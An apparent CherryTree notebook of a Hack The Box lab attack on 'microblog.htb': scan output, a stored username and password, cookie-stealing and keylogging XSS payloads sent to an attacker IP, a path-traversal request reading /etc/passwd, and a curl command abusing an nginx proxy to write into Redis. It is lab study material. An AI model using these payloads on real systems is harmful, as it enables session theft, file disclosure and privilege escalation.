PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c3:97:ce:83:7d:25:5d:5d:ed:b5:45:cd:f2:0b:05:4f (RSA)
|   256 b3:aa:30:35:2b:99:7d:20:fe:b6:75:88:40:a5:17:c1 (ECDSA)
|_  256 fa:b3:7d:6e:1a:bc:d1:4b:68:ed:d6:e8:97:67:27:d7 (ED25519)
80/tcp   open  http    nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0
3000/tcp open  http    nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to </rich_text>
        <rich_text link="webs http://microblog.htb:3000/">http://microblog.htb:3000/</rich_text>
        <rich_text>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at </rich_text>
        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
        <rich_text> .
# Nmap done at Fri Aug 11 05:47:11 2023 -- 1 IP address (1 host up) scanned in 28.27 seconds</rich_text>
      </node>
      <node name="creds" unique_id="53" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691747105" ts_lastsave="1691763056">
        <rich_text>cooper:zooperdoopercooper
git:</rich_text>
      </node>
      <node name="buster" unique_id="54" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691747347" ts_lastsave="1691752156">
        <rich_text>feroxbuster -u </rich_text>
        <rich_text link="webs http://app.microblog.htb/">http://app.microblog.htb/</rich_text>
        <rich_text>    

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ </rich_text>
        <rich_text link="webs http://app.microblog.htb/">http://app.microblog.htb/</rich_text>
        <rich_text>
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       11w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       11w      169c </rich_text>
        <rich_text link="webs http://app.microblog.htb/logout">http://app.microblog.htb/logout</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://app.microblog.htb/logout/">http://app.microblog.htb/logout/</rich_text>
        <rich_text>
301      GET        7l       11w      169c </rich_text>
        <rich_text link="webs http://app.microblog.htb/register">http://app.microblog.htb/register</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://app.microblog.htb/register/">http://app.microblog.htb/register/</rich_text>
        <rich_text>
301      GET        7l       11w      169c </rich_text>
        <rich_text link="webs http://app.microblog.htb/login">http://app.microblog.htb/login</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://app.microblog.htb/login/">http://app.microblog.htb/login/</rich_text>
        <rich_text>
301      GET        7l       11w      169c </rich_text>
        <rich_text link="webs http://app.microblog.htb/dashboard">http://app.microblog.htb/dashboard</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://app.microblog.htb/dashboard/">http://app.microblog.htb/dashboard/</rich_text>
        <rich_text>
200      GET      154l      843w   168397c </rich_text>
        <rich_text link="webs http://app.microblog.htb/brain.ico">http://app.microblog.htb/brain.ico</rich_text>
        <rich_text>
200      GET     1308l     8063w   731222c </rich_text>
        <rich_text link="webs http://app.microblog.htb/brain.png">http://app.microblog.htb/brain.png</rich_text>
        <rich_text>
200      GET       83l      306w     3976c </rich_text>
        <rich_text link="webs http://app.microblog.htb/">http://app.microblog.htb/</rich_text>
        <rich_text>
[####################] - 29s   150008/150008  0s      found:7       errors:0      
[####################] - 29s    30000/30000   1035/s  </rich_text>
        <rich_text link="webs http://app.microblog.htb/">http://app.microblog.htb/</rich_text>
        <rich_text> 
[####################] - 28s    30000/30000   1056/s  </rich_text>
        <rich_text link="webs http://app.microblog.htb/logout/">http://app.microblog.htb/logout/</rich_text>
        <rich_text> 
[####################] - 28s    30000/30000   1060/s  </rich_text>
        <rich_text link="webs http://app.microblog.htb/register/">http://app.microblog.htb/register/</rich_text>
        <rich_text> 
[####################] - 29s    30000/30000   1046/s  </rich_text>
        <rich_text link="webs http://app.microblog.htb/login/">http://app.microblog.htb/login/</rich_text>
        <rich_text> 
[####################] - 29s    30000/30000   1045/s  </rich_text>
        <rich_text link="webs http://app.microblog.htb/dashboard/">http://app.microblog.htb/dashboard/</rich_text>
        <rich_text>


</rich_text>
        <rich_text link="webs http://microblog.htb:3000/cooper/microblog">http://microblog.htb:3000/cooper/microblog</rich_text>
        <rich_text>


feroxbuster -u </rich_text>
        <rich_text link="webs http://microblog.htb:3000/">http://microblog.htb:3000/</rich_text>
        <rich_text>

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ </rich_text>
        <rich_text link="webs http://microblog.htb:3000/">http://microblog.htb:3000/</rich_text>
        <rich_text>
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w       11c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      280l      761w     9624c </rich_text>
        <rich_text link="webs http://microblog.htb:3000/user/login">http://microblog.htb:3000/user/login</rich_text>
        <rich_text>
303      GET        2l        3w       38c </rich_text>
        <rich_text link="webs http://microblog.htb:3000/admin">http://microblog.htb:3000/admin</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://microblog.htb:3000/user/login">http://microblog.htb:3000/user/login</rich_text>
        <rich_text>
200      GET       22l      110w     7803c </rich_text>
        <rich_text link="webs http://microblog.htb:3000/assets/img/favicon.png">http://microblog.htb:3000/assets/img/favicon.png</rich_text>
        <rich_text>
404      GET        0l        0w        0c </rich_text>
        <rich_text link="webs http://microblog.htb:3000/assets/">http://microblog.htb:3000/assets/</rich_text>
        <rich_text>
404      GET        0l        0w        0c </rich_text>
        <rich_text link="webs http://microblog.htb:3000/assets/css/">http://microblog.htb:3000/assets/css/</rich_text>
        <rich_text>
303      GET        2l        3w       41c </rich_text>
        <rich_text link="webs http://microblog.htb:3000/explore/">http://microblog.htb:3000/explore/</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://microblog.htb:3000/explore/repos">http://microblog.htb:3000/explore/repos</rich_text>
        <rich_text>
200      GET       47l      313w    25954c </rich_text>
        <rich_text link="webs http://microblog.htb:3000/assets/img/logo.png">http://microblog.htb:3000/assets/img/logo.png</rich_text>
        <rich_text>
404      GET        0l        0w        0c </rich_text>
        <rich_text link="webs http://microblog.htb:3000/assets/js/">http://microblog.htb:3000/assets/js/</rich_text>
        <rich_text>
404      GET        0l        0w        0c </rich_text>
        <rich_text link="webs http://microblog.htb:3000/assets/img/">http://microblog.htb:3000/assets/img/</rich_text>
        <rich_text>
200      GET       13l       73w      772c </rich_text>
        <rich_text link="webs http://microblog.htb:3000/api/swagger">http://microblog.htb:3000/api/swagger</rich_text>
        <rich_text>
200      GET        1l      221w     2207c </rich_text>
        <rich_text link="webs http://microblog.htb:3000/assets/img/logo.svg">http://microblog.htb:3000/assets/img/logo.svg</rich_text>
        <rich_text>
200      GET        1l      221w     2207c </rich_text>
        <rich_text link="webs http://microblog.htb:3000/assets/img/favicon.svg">http://microblog.htb:3000/assets/img/favicon.svg</rich_text>
        <rich_text>
200      GET        1l      440w    14145c </rich_text>
        <rich_text link="webs http://microblog.htb:3000/assets/css/theme-auto.css">http://microblog.htb:3000/assets/css/theme-auto.css</rich_text>
        <rich_text>
200      GET      893l     6393w    46002c </rich_text>
        <rich_text link="webs http://microblog.htb:3000/assets/js/licenses.txt">http://microblog.htb:3000/assets/js/licenses.txt</rich_text>
        <rich_text>
200      GET      321l     1345w    14414c </rich_text>
        <rich_text link="webs http://microblog.htb:3000/explore/repos">http://microblog.htb:3000/explore/repos</rich_text>
        <rich_text>
401      GET        1l        1w       50c </rich_text>
        <rich_text link="webs http://microblog.htb:3000/v2">http://microblog.htb:3000/v2</rich_text>
        <rich_text>
200      GET      113l    14043w   838890c </rich_text>
        <rich_text link="webs http://microblog.htb:3000/assets/js/index.js">http://microblog.htb:3000/assets/js/index.js</rich_text>
        <rich_text>
200      GET        1l    18087w   865788c </rich_text>
        <rich_text link="webs http://microblog.htb:3000/assets/css/index.css">http://microblog.htb:3000/assets/css/index.css</rich_text>
        <rich_text>
200      GET      273l     1172w    13239c </rich_text>
        <rich_text link="webs http://microblog.htb:3000/">http://microblog.htb:3000/</rich_text>
        <rich_text>
303      GET        2l        3w       38c </rich_text>
        <rich_text link="webs http://microblog.htb:3000/issues">http://microblog.htb:3000/issues</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://microblog.htb:3000/user/login">http://microblog.htb:3000/user/login</rich_text>
        <rich_text>
303      GET        2l        3w       41c </rich_text>
        <rich_text link="webs http://microblog.htb:3000/explore">http://microblog.htb:3000/explore</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://microblog.htb:3000/explore/repos">http://microblog.htb:3000/explore/repos</rich_text>
        <rich_text>
303      GET        2l        3w       38c </rich_text>
        <rich_text link="webs http://microblog.htb:3000/notifications">http://microblog.htb:3000/notifications</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://microblog.htb:3000/user/login">http://microblog.htb:3000/user/login</rich_text>
        <rich_text>
303      GET        2l        3w       38c </rich_text>
        <rich_text link="webs http://microblog.htb:3000/milestones">http://microblog.htb:3000/milestones</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://microblog.htb:3000/user/login">http://microblog.htb:3000/user/login</rich_text>
        <rich_text>
[####################] - 40s    30020/30020   0s      found:23      errors:1      
[####################] - 40s    30000/30000   759/s   </rich_text>
        <rich_text link="webs http://microblog.htb:3000/">http://microblog.htb:3000/</rich_text>
        <rich_text>







gobuster vhost -u </rich_text>
        <rich_text link="webs http://microblog.htb">http://microblog.htb</rich_text>
        <rich_text> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             </rich_text>
        <rich_text link="webs http://microblog.htb">http://microblog.htb</rich_text>
        <rich_text>
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/08/11 05:51:43 Starting gobuster in VHOST enumeration mode
===============================================================
Found: app.microblog.htb Status: 200 [Size: 3976]
Found: sunny.microblog.htb Status: 200 [Size: 3732]
Progress: 4882 / 4990 (97.84%)
===============================================================
2023/08/11 05:52:00 Finished
===============================================================</rich_text>
      </node>
      <node name="nikto" unique_id="55" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691747419" ts_lastsave="1691748711">
        <rich_text>nikto -h </rich_text>
        <rich_text link="webs http://app.microblog.htb/">http://app.microblog.htb/</rich_text>
        <rich_text>     
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.129.229.3
+ Target Hostname:    app.microblog.htb
+ Target Port:        80
+ Start Time:         2023-08-11 05:50:14 (GMT-4)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0
+ /: The anti-clickjacking X-Frame-Options header is not present. See: </rich_text>
        <rich_text link="webs https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options</rich_text>
        <rich_text>
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: </rich_text>
        <rich_text link="webs https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/">https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/</rich_text>
        <rich_text>
+ /: Cookie username created without the httponly flag. See: </rich_text>
        <rich_text link="webs https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies">https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies</rich_text>
        <rich_text>
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /login/: This might be interesting.
+ /register/: This might be interesting.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8047 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2023-08-11 05:55:05 (GMT-4) (291 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested





nikto -h  </rich_text>
        <rich_text link="webs http://microblog.htb:3000/">http://microblog.htb:3000/</rich_text>
        <rich_text>     
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.129.229.3
+ Target Hostname:    microblog.htb
+ Target Port:        3000
+ Start Time:         2023-08-11 05:50:42 (GMT-4)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: </rich_text>
        <rich_text link="webs https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/">https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/</rich_text>
        <rich_text>
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /v2/_catalog: Uncommon header 'docker-distribution-api-version' found, with contents: registry/2.0.
+ /v2/_catalog: This is the Docker Registry server. See: </rich_text>
        <rich_text link="webs https://docs.docker.com/registry/">https://docs.docker.com/registry/</rich_text>
        <rich_text>
+ /.well-known/openid-configuration: OpenID Provider Configuration Information.
+ 8115 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2023-08-11 05:55:48 (GMT-4) (306 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested</rich_text>
      </node>
      <node name="exploit" unique_id="56" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691748711" ts_lastsave="1691766785">
        <rich_text>&lt;img src=http://10.10.14.68/&gt;

&lt;script&gt;alert(document.cookie);&lt;/script&gt;

&lt;img src=x onerror="location.href='http://10.10.14.68/?c='+ document.cookie"&gt;

&lt;script&gt;document.onkeypress = function(e) { fetch('</rich_text>
        <rich_text link="webs http://10.10.14.68/log?key='">http://10.10.14.68/log?key='</rich_text>
        <rich_text> + btoa(e.key) );}&lt;/script&gt;

&lt;iframe src="</rich_text>
        <rich_text link="webs http://testc.microblog.htb">http://sunny.microblog.htb</rich_text>
        <rich_text>/edit" width=800 height=800&gt;&lt;/iframe&gt;

&lt;iframe src="</rich_text>
        <rich_text foreground="#ce9178">/var/www/pro-files/bulletproof.php</rich_text>
        <rich_text>"&gt;&lt;/iframe&gt;

</rich_text>
        <rich_text link="webs http://microblog.htb:3000/explore/repos">http://microblog.htb:3000/explore/repos</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs http://microblog.htb:3000/cooper/microblog">http://microblog.htb:3000/cooper/microblog</rich_text>
        <rich_text>



Create sub domain

create h1 and intercept it in burp

</rich_text>
        <rich_text foreground="#6a9955">//add header</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#c586c0">if</rich_text>
        <rich_text foreground="#d4d4d4"> (</rich_text>
        <rich_text foreground="#dcdcaa">isset</rich_text>
        <rich_text foreground="#d4d4d4">(</rich_text>
        <rich_text foreground="#9cdcfe">$_POST</rich_text>
        <rich_text foreground="#d4d4d4">[</rich_text>
        <rich_text foreground="#ce9178">'header'</rich_text>
        <rich_text foreground="#d4d4d4">]) &amp;&amp; </rich_text>
        <rich_text foreground="#dcdcaa">isset</rich_text>
        <rich_text foreground="#d4d4d4">(</rich_text>
        <rich_text foreground="#9cdcfe">$_POST</rich_text>
        <rich_text foreground="#d4d4d4">[</rich_text>
        <rich_text foreground="#ce9178">'id'</rich_text>
        <rich_text foreground="#d4d4d4">])) {</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#d4d4d4">    </rich_text>
        <rich_text foreground="#dcdcaa">chdir</rich_text>
        <rich_text foreground="#d4d4d4">(</rich_text>
        <rich_text foreground="#dcdcaa">getcwd</rich_text>
        <rich_text foreground="#d4d4d4">() . </rich_text>
        <rich_text foreground="#ce9178">"/../content"</rich_text>
        <rich_text foreground="#d4d4d4">);</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#d4d4d4">    </rich_text>
        <rich_text foreground="#9cdcfe">$html</rich_text>
        <rich_text foreground="#d4d4d4"> = </rich_text>
        <rich_text foreground="#ce9178">"&lt;div class = </rich_text>
        <rich_text foreground="#d7ba7d">\"</rich_text>
        <rich_text foreground="#ce9178">blog-h1 blue-fill</rich_text>
        <rich_text foreground="#d7ba7d">\"</rich_text>
        <rich_text foreground="#ce9178">&gt;&lt;b&gt;{</rich_text>
        <rich_text foreground="#9cdcfe">$_POST</rich_text>
        <rich_text foreground="#ce9178">['header']}&lt;/b&gt;&lt;/div&gt;"</rich_text>
        <rich_text foreground="#d4d4d4">;</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#d4d4d4">    </rich_text>
        <rich_text foreground="#9cdcfe">$post_file</rich_text>
        <rich_text foreground="#d4d4d4"> = </rich_text>
        <rich_text foreground="#dcdcaa">fopen</rich_text>
        <rich_text foreground="#d4d4d4">(</rich_text>
        <rich_text foreground="#ce9178">"{</rich_text>
        <rich_text foreground="#9cdcfe">$_POST</rich_text>
        <rich_text foreground="#ce9178">['id']}"</rich_text>
        <rich_text foreground="#d4d4d4">, </rich_text>
        <rich_text foreground="#ce9178">"w"</rich_text>
        <rich_text foreground="#d4d4d4">);</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#d4d4d4">    </rich_text>
        <rich_text foreground="#dcdcaa">fwrite</rich_text>
        <rich_text foreground="#d4d4d4">(</rich_text>
        <rich_text foreground="#9cdcfe">$post_file</rich_text>
        <rich_text foreground="#d4d4d4">, </rich_text>
        <rich_text foreground="#9cdcfe">$html</rich_text>
        <rich_text foreground="#d4d4d4">);</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#d4d4d4">    </rich_text>
        <rich_text foreground="#dcdcaa">fclose</rich_text>
        <rich_text foreground="#d4d4d4">(</rich_text>
        <rich_text foreground="#9cdcfe">$post_file</rich_text>
        <rich_text foreground="#d4d4d4">);</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#d4d4d4">    </rich_text>
        <rich_text foreground="#9cdcfe">$order_file</rich_text>
        <rich_text foreground="#d4d4d4"> = </rich_text>
        <rich_text foreground="#dcdcaa">fopen</rich_text>
        <rich_text foreground="#d4d4d4">(</rich_text>
        <rich_text foreground="#ce9178">"order.txt"</rich_text>
        <rich_text foreground="#d4d4d4">, </rich_text>
        <rich_text foreground="#ce9178">"a"</rich_text>
        <rich_text foreground="#d4d4d4">);</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#d4d4d4">    </rich_text>
        <rich_text foreground="#dcdcaa">fwrite</rich_text>
        <rich_text foreground="#d4d4d4">(</rich_text>
        <rich_text foreground="#9cdcfe">$order_file</rich_text>
        <rich_text foreground="#d4d4d4">, </rich_text>
        <rich_text foreground="#9cdcfe">$_POST</rich_text>
        <rich_text foreground="#d4d4d4">[</rich_text>
        <rich_text foreground="#ce9178">'id'</rich_text>
        <rich_text foreground="#d4d4d4">] . </rich_text>
        <rich_text foreground="#ce9178">"</rich_text>
        <rich_text foreground="#d7ba7d">\n</rich_text>
        <rich_text foreground="#ce9178">"</rich_text>
        <rich_text foreground="#d4d4d4">);  </rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#d4d4d4">    </rich_text>
        <rich_text foreground="#dcdcaa">fclose</rich_text>
        <rich_text foreground="#d4d4d4">(</rich_text>
        <rich_text foreground="#9cdcfe">$order_file</rich_text>
        <rich_text foreground="#d4d4d4">);</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#d4d4d4">    </rich_text>
        <rich_text foreground="#dcdcaa">header</rich_text>
        <rich_text foreground="#d4d4d4">(</rich_text>
        <rich_text foreground="#ce9178">"Location: /edit?message=Section added!&amp;status=success"</rich_text>
        <rich_text foreground="#d4d4d4">);</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#d4d4d4">}</rich_text>
        <rich_text>


this code is vulnerable to LFI on id

POST /edit/index.php HTTP/1.1
Host: testc.microblog.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Origin: </rich_text>
        <rich_text link="webs http://testc.microblog.htb">http://testc.microblog.htb</rich_text>
        <rich_text>
Connection: close
Referer: </rich_text>
        <rich_text link="webs http://testc.microblog.htb/edit/">http://testc.microblog.htb/edit/</rich_text>
        <rich_text>
Cookie: username=fudunsp094duhpcp9eg6c9skiv
Upgrade-Insecure-Requests: 1

id=../../../../../etc/passwd&amp;header=test

root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinsystemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologinsystemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologincooper:x:1000:1000::/home/cooper:/bin/bashredis:x:103:33::/var/lib/redis:/usr/sbin/nologingit:x:104:111:Git Version Control,,,:/home/git:/bin/bashmessagebus:x:105:112::/nonexistent:/usr/sbin/nologinsshd:x:106:65534::/run/sshd:/usr/sbin/nologin_laurel:x:997:997::/var/log/laurel:/bin/false

nginx.conf

user www-data;worker_processes auto;pid /run/nginx.pid;include /etc/nginx/modules-enabled/*.conf;events { worker_connections 768; # multi_accept on;}http { ## # Basic Settings ## sendfile on; tcp_nopush on; types_hash_max_size 2048; # server_tokens off; # server_names_hash_bucket_size 64; # server_name_in_redirect off; include /etc/nginx/mime.types; default_type application/octet-stream; ## # SSL Settings ## ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE ssl_prefer_server_ciphers on; ## # Logging Settings ## access_log /var/log/nginx/access.log; error_log /var/log/nginx/error.log; ## # Gzip Settings ## gzip on; # gzip_vary on; # gzip_proxied any; # gzip_comp_level 6; # gzip_buffers 16 8k; # gzip_http_version 1.1; # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript; ## # Virtual Host Configs ## include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*;}#mail {# # See sample authentication script at:# # </rich_text>
        <rich_text link="webs http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript##">http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript##</rich_text>
        <rich_text> # auth_http localhost/auth.php;# # pop3_capabilities "TOP" "USER";# # imap_capabilities "IMAP4rev1" "UIDPLUS";## server {# listen localhost:110;# protocol pop3;# proxy on;# }## server {# listen localhost:143;# protocol imap;# proxy on;# }#}


/etc/nginx/sites-enabled/default


### You should look at the following URL's in order to grasp a solid understanding# of Nginx configuration files in order to fully unleash the power of Nginx.# </rich_text>
        <rich_text link="webs https://www.nginx.com/resources/wiki/start/#">https://www.nginx.com/resources/wiki/start/#</rich_text>
        <rich_text> </rich_text>
        <rich_text link="webs https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/#">https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/#</rich_text>
        <rich_text> </rich_text>
        <rich_text link="webs https://wiki.debian.org/Nginx/DirectoryStructure##">https://wiki.debian.org/Nginx/DirectoryStructure##</rich_text>
        <rich_text> In most cases, administrators will remove this file from sites-enabled/ and# leave it as reference inside of sites-available where it will continue to be# updated by the nginx packaging team.## This file will automatically load configuration files provided by other# applications, such as Drupal or Wordpress. These applications will be made# available underneath a path with that package name, such as /drupal8.## Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples.### Default server configuration#server { listen 80 default_server; listen [::]:80 default_server; # SSL configuration # # listen 443 ssl default_server; # listen [::]:443 ssl default_server; # # Note: You should disable gzip for SSL traffic. # See: </rich_text>
        <rich_text link="webs https://bugs.debian.org/773332">https://bugs.debian.org/773332</rich_text>
        <rich_text> # # Read up on ssl_ciphers to ensure a secure configuration. # See: </rich_text>
        <rich_text link="webs https://bugs.debian.org/765782">https://bugs.debian.org/765782</rich_text>
        <rich_text> # # Self signed certs generated by the ssl-cert package # Don't use them in a production server! # # include snippets/snakeoil.conf; root /var/www/html; # Add index.php to the list if you are using PHP index index.html index.htm index.nginx-debian.html; server_name _; location / { # First attempt to serve request as file, then # as directory, then fall back to displaying a 404. try_files $uri $uri/ =404; } # pass PHP scripts to FastCGI server # #location ~ \.php$ { # include snippets/fastcgi-php.conf; # # # With php-fpm (or other unix sockets): # fastcgi_pass unix:/run/php/php7.4-fpm.sock; # # With php-cgi (or other tcp sockets): # fastcgi_pass 127.0.0.1:9000; #} # deny access to .htaccess files, if Apache's document root # concurs with nginx's one # #location ~ /\.ht { # deny all; #}}server { listen 80; listen [::]:80; root /var/www/microblog/app; index index.html index.htm index-nginx-debian.html; server_name microblog.htb; location / { return 404; } location = /static/css/health/ { resolver 127.0.0.1; proxy_pass </rich_text>
        <rich_text link="webs http://css.microbucket.htb/health.txt;">http://css.microbucket.htb/health.txt;</rich_text>
        <rich_text> } location = /static/js/health/ { resolver 127.0.0.1; proxy_pass </rich_text>
        <rich_text link="webs http://js.microbucket.htb/health.txt;">http://js.microbucket.htb/health.txt;</rich_text>
        <rich_text> } location ~ /static/(.*)/(.*) { resolver 127.0.0.1; proxy_pass </rich_text>
        <rich_text link="webs http://$1.microbucket.htb/$2;">http://$1.microbucket.htb/$2;</rich_text>
        <rich_text> }}


we see </rich_text>
        <rich_text foreground="#ce9178">var/run/redis/redis.sock</rich_text>
        <rich_text> in the source code

and in nginx deafault conf we see:

location ~ /static/(.*)/(.*) 
{ resolver 127.0.0.1; proxy_pass </rich_text>
        <rich_text link="webs http://$1.microbucket.htb/$2;">http://$1.microbucket.htb/$2;</rich_text>
        <rich_text> }}

</rich_text>
        <rich_text link="webs https://exploit-notes.hdks.org/exploit/database/redis-pentesting/">https://exploit-notes.hdks.org/exploit/database/redis-pentesting/</rich_text>
        <rich_text>

based on this site, we can exploit redis with curl if we find:

location ~ /(.*)/(.*) {
    resolver 127.0.0.1; proxy_pass </rich_text>
        <rich_text link="webs http://example.com/$1;">http://example.com/$1;</rich_text>
        <rich_text>
}

then we can do:

# HSET &lt;key&gt; &lt;field&gt; &lt;value&gt;
key = username
field = pro
value = true
curl -X "HSET" </rich_text>
        <rich_text link="webs http://microblog.htb/static/unix:/var/run/redis/redis.sock:testb%20pro%20true%20/abc">http://microblog.htb/static/unix:/var/run/redis/redis.sock:testb%20pro%20true%20/abc</rich_text>
        <rich_text>

now we are pro user


use previous exploit for h1 and write to upload folder:

